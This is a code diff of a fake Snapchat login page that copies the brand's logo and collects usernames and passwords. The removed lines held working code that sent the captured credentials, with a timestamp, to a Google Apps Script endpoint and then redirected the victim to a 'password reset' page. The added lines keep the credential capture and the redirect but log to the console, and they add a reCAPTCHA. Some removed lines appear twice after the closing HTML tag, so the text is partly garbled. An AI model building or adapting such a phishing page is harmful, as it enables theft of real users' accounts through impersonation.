@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <title>Snapchat Login</title>
     <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <style>
         .error-message {
             color: red;
@@ -16,7 +17,7 @@
     <div class="form">
         <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
         <h1>Snapchat Login</h1>
-        <form id="loginForm">
+        <form id="loginForm" action="password_reset.html" method="post">
             <label for="username">Username or Email Address:</label><br>
             <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br>
             <span id="usernameError" class="error-message"></span><br>
@@ -24,6 +25,9 @@
             <label for="password">Password:</label><br>
             <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
             <span id="passwordError" class="error-message"></span><br>
+            
+            <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
+            <span id="captchaError" class="error-message"></span><br>
             
             <input type="submit" value="Log In">
             <span id="loginError" class="error-message"></span><br>
@@ -36,20 +40,29 @@
             
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
+            var recaptchaResponse = grecaptcha.getResponse();
             
-            if (validateForm(username, password)) {
-                // Send captured data to remote storage (Google Apps Script endpoint)
+            if (validateForm(username, password, recaptchaResponse)) {
+                // Optional: Verify recaptchaResponse with your server-side logic
+                // For educational purposes, the client-side check is shown here.
+                if (recaptchaResponse.length === 0) {
+                    document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
+                    return;
+                }
+                
+                // Send captured data to server (you can replace this with actual form submission)
                 logLogin(username, password);
             }
         });
         
-        function validateForm(username, password) {
+        function validateForm(username, password, recaptchaResponse) {
             var isValid = true;
             
             // Reset error messages
             document.getElementById('usernameError').textContent = '';
             document.getElementById('passwordError').textContent = '';
             document.getElementById('loginError').textContent = '';
+            document.getElementById('captchaError').textContent = '';
             
             // Validate username
             if (!username.trim()) {
@@ -63,52 +76,22 @@
                 isValid = false;
             }
             
+            // Validate reCAPTCHA
+            if (recaptchaResponse.length === 0) {
+                document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
+                isValid = false;
+            }
+            
             return isValid;
         }
         
         function logLogin(username, password) {
-            var url = "https://script.google.com/macros/s/AKfycbwLOI3FQgQZjTcqe9qHTzqAHhCel31IFEwdfotp6PE6p7lZoIU0K6pB-DzPMKyVZgP2/exec"; // Update with your deployed Google Apps Script URL
+            // This function should ideally make a server-side request to log the login attempt securely.
+            // For demonstration purposes, it logs to console.
+            console.log('Logging in:', username, password);
             
-            var data = {
-                "username": username,
-                "password": password,
-                "login_timestamp": new Date().toISOString()
-            };
-            
-            var queryString = Object.keys(data).map(key => key + '=' + encodeURIComponent(data[key])).join('&');
-            
-            var finalUrl = url + '?' + queryString;
-            
-            // Send data using fetch API
-            fetch(finalUrl)
-                .then(response => {
-                    if (response.ok) {
-                        console.log("Login logged successfully");
-                        // Redirect to password reset page (this is for demonstration purposes only)
-                        window.location.href = "password_reset.html";
-                    } else {
-                        console.error("Error logging login");
-                        // Handle error (optional)
-                        document.getElementById('loginError').textContent = 'Error logging login. Please try again later.';
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    // Handle network error (optional)
-                    document.getElementById('loginError').textContent = 'Network error occurred. Please try again later.';
-                });
-        }
-    </script>
-</body>
-</html>
- 'Error logging login. Please try again later.';
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    // Handle network error (optional)
-                    document.getElementById('loginError').textContent = 'Network error occurred. Please try again later.';
-                });
+            // Redirect to password reset page (this is for demonstration purposes only)
+            window.location.href = "password_reset.html";
         }
     </script>
 </body>
